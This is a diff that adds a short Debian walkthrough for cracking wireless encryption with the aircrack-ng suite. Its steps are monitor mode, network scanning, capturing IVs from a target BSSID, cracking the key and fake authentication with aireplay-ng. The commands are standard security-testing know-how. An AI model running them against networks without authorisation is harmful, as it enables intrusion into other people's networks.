@@ -13,4 +13,14 @@ Setup:
 
 	Debian
 		1. Start the wireless in monitor mode
-			
+			airmon-ng stop wlan0
+			# Put your card in monitor mode
+			airmon-ng start wlan0
+		2. Scan for networks
+			airodump-ng wlan0
+		3. Sniffing IVs (Initialization Vectors)
+			airodump-ng -c <channel number> --bssid [BSSID] -w dump wlan0
+		4. Cracking
+			aircrack-ng -b <MAC Address of target> <fileWithCapturedPackets.cap>
+		5. Fake Auth
+			aireplay-ng --fakeauth 0 -e "your network ESSID" -a <BSSID> wlan0
